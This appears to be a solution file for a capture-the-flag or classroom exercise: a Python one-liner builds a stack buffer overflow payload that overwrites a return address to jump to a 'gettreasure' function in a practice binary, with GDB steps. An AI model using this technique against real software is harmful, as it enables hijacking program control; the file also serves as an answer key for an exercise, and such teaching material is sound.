# Enter address of gettreasure in little endian (what GDB displays by default on x86)
# You can find this with the following commands:
#   gdb treasure
#   info address gettreasure
address = "\x08\x04\x9d\x55"
print("A"*112 + address[::-1])

# Then run the program with the exploit payload:
#   set args $(python .solution.py)
#   run